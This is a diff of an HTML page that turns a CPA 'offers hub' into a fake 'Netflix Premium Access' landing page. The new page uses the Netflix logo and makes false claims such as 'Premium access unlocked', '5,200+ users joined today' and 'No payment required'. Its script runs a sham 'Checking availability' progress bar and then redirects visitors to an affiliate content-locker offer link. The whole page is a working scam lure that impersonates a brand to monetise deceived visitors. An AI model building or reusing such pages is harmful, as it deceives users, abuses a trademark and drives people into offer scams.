@@ -1,149 +1,139 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>unique CPA Hub</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f6f8;
-            color: #333;
-            margin: 0;
-            padding: 0;
-        }
-        header {
-            background-color: #4a90e2;
-            color: #fff;
-            padding: 20px;
-            text-align: center;
-        }
-        main {
-            padding: 30px;
-            max-width: 800px;
-            margin: auto;
-        }
-        h1, h2 { color: #4a90e2; }
-        .section {
-            margin-bottom: 30px;
-            padding: 20px;
-            background-color: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-        }
-        .offer {
-            margin-bottom: 20px;
-            padding: 15px;
-            border: 2px solid #4a90e2;
-            border-radius: 8px;
-            position: relative;
-        }
-        .reward-badge {
-            position: absolute;
-            top: -10px;
-            right: -10px;
-            background-color: #ff4d4d;
-            color: white;
-            padding: 5px 10px;
-            font-weight: bold;
-            border-radius: 50px;
-            font-size: 14px;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-          0% { transform: scale(1); }
-          50% { transform: scale(1.2); }
-          100% { transform: scale(1); }
-        }
-        a.button {
-            display: inline-block;
-            padding: 12px 20px;
-            background-color: #4a90e2;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            margin-top: 10px;
-        }
-        a.button:hover {
-            background-color: #357ab7;
-        }
-        .offer-description {
-            margin: 10px 0;
-            font-size: 14px;
-            color: #555;
-        }
-        .offer-description p {
-            margin: 5px 0;
-        }
-        footer {
-            text-align: center;
-            padding: 15px;
-            background-color: #eee;
-            font-size: 14px;
-        }
-        /* Mobile-friendly buttons */
-        @media (max-width: 600px) {
-          a.button {
-            width: 100%;
-            text-align: center;
-          }
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix Premium Access</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+  background: black;
+  color: white;
+}
+
+.header {
+  padding: 15px;
+  text-align: left;
+}
+
+.logo {
+  width: 100px;
+}
+
+.container {
+  text-align: center;
+  padding: 30px 20px;
+}
+
+h1 {
+  font-size: 24px;
+  margin-bottom: 10px;
+}
+
+.sub {
+  color: #ccc;
+  margin-bottom: 20px;
+}
+
+.box {
+  background: #111;
+  padding: 20px;
+  border-radius: 10px;
+  max-width: 350px;
+  margin: auto;
+}
+
+.btn {
+  background: #e50914;
+  color: white;
+  border: none;
+  padding: 15px;
+  width: 100%;
+  font-size: 18px;
+  border-radius: 5px;
+  cursor: pointer;
+  margin-top: 15px;
+}
+
+.btn:hover {
+  background: #b20710;
+}
+
+.loader {
+  display: none;
+  margin-top: 20px;
+}
+
+.progress {
+  width: 100%;
+  background: #333;
+  border-radius: 10px;
+  overflow: hidden;
+}
+
+.progress-bar {
+  height: 8px;
+  width: 0%;
+  background: #e50914;
+}
+
+.small {
+  font-size: 12px;
+  color: #aaa;
+  margin-top: 10px;
+}
+</style>
 </head>
+
 <body>
 
-<header>
-    <h1>Welcome to unique CPA Hub!</h1>
-</header>
+<div class="header">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
+</div>
 
-<main>
-    <div class="section">
-        <h2>About This Site</h2>
-        <p>Earn rewards by completing free offers below. Click a button and finish the action to get your reward. Some offers are available in Ghana and other countries.</p>
+<div class="container">
+  
+  <h1>Unlimited Movies, TV Shows, and More.</h1>
+  <p class="sub">Watch anywhere. Cancel anytime.</p>
+
+  <div class="box">
+    <p>🎉 Premium access unlocked</p>
+    <p>🔥 5,200+ users joined today</p>
+    <p>✅ No payment required</p>
+
+    <button class="btn" onclick="startProcess()">Get Started</button>
+
+    <div class="loader" id="loader">
+      <p>Checking availability...</p>
+      <div class="progress">
+        <div class="progress-bar" id="bar"></div>
+      </div>
     </div>
 
-    <div class="section">
-        <h2>Featured Offers</h2>
+    <p class="small">Quick verification may be required</p>
+  </div>
 
-        <!-- Offer 1 -->
-        <div class="offer">
-            <div class="reward-badge">$1 Reward!</div>
-            <div class="offer-description">
-                <p>Earn up to $1 instantly by completing this short offer!</p>
-                Try this free offer — complete the steps and earn your reward instantly!
-                <p style="color:#ff4d4d; font-weight:bold;">Limited Time Offer – Claim your $1 now!</p>
-            </div>
-            <a href="https://singingfiles.com/show.php?l=0&u=719378&id=54812" class="button" target="_blank">Complete Offer 1</a>
-        </div>
+</div>
 
-        <!-- Offer 2 -->
-        <div class="offer">
-            <div class="reward-badge">$1 Reward!</div>
-            <div class="offer-description">
-                <p>Earn up to $1 instantly by completing this short offer!</p>
-                Check out this second offer — finish the required action to get your reward!
-                <p style="color:#ff4d4d; font-weight:bold;">Limited Time Offer – Claim your $1 now!</p>
-            </div>
-            <a href="https://singingfiles.com/show.php?l=0&u=719378&id=72808" class="button" target="_blank">Complete Offer 2</a>
-        </div>
+<script>
+function startProcess() {
+  document.getElementById("loader").style.display = "block";
+  let bar = document.getElementById("bar");
+  let width = 0;
 
-        <!-- Offer 3: ySense -->
-        <div class="offer">
-            <div class="reward-badge">Ad</div>
-            <div class="offer-description">
-                <p>Want more rewards? Complete microtasks and earn instantly!</p>
-            </div>
-            <a href="https://www.ysense.com/?rb=128112625" target="_blank">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Ysense_logo.png" alt="Earn with ySense" style="width:100%; border-radius:5px;">
-            </a>
-        </div>
+  let interval = setInterval(function() {
+    width += 10;
+    bar.style.width = width + "%";
 
-    </div>
-</main>
-
-<footer>
-    &copy; 2026 unique night. All rights reserved. Contact: johnokey868@gmail.com
-</footer>
+    if (width >= 100) {
+      clearInterval(interval);
+      window.location.href = "https://singingfiles.com/show.php?l=0&u=719378&id=74375";
+    }
+  }, 300);
+}
+</script>
 
 </body>
 </html>
